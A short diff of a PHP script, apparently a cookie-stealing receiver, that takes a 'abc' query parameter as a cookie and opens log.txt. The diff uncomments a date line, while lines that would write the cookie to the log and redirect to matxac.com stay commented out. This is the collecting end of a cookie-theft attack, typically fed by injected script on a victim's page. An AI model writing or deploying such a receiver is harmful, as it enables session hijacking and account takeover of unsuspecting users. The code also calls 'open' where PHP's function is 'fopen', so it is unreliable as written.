@@ -5,7 +5,7 @@ include 'PHPMailer/class.phpmailer.php';
 if (isset($_GET["abc"])) {
     $cookie = $_GET["abc"];
     $f = open("log.txt", "a");
-//     $t = date("Y-m-d",time());
+    $t = date("Y-m-d",time());
 //     fwrite( $f, $t.":\n".$cookie."\n\n");
 //     header('Location: http://matxac.com/');
     
